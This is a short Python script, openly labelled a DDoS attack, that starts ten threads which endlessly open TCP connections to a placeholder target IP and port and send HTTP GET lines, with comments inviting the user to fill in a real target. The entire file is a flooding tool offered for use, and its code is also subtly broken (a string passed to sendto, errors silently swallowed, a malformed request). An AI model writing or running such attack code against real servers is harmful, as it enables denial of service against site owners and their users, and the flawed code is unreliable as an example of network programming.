import socket
import random
import threading

target_ip = "192.168.0.1"  # Replace with the target IP address
target_port = 80  # Replace with the target port
num_threads = 10  # Number of threads to use for the attack

def ddos_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto("GET /" + target_ip + " HTTP/1.1\r\n", (target_ip, target_port))
            s.close()
        except:
            pass

# Start the DDoS attack
for _ in range(num_threads):
    thread = threading.Thread(target=ddos_attack)
    thread.start()
